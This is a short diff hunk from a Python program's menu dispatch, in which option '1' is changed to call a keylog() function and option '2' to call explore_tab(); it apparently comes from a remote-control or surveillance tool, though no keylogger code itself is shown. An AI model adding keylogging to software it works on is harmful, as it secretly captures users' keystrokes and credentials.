@@ -219,12 +219,12 @@ def control():
 
 		if awn_control == "1":
 			OS()
-			explore_tab()
+			keylog()
 
 
 		elif awn_control == "2":
 			OS()
-			talk()
+			explore_tab()
 
 
 
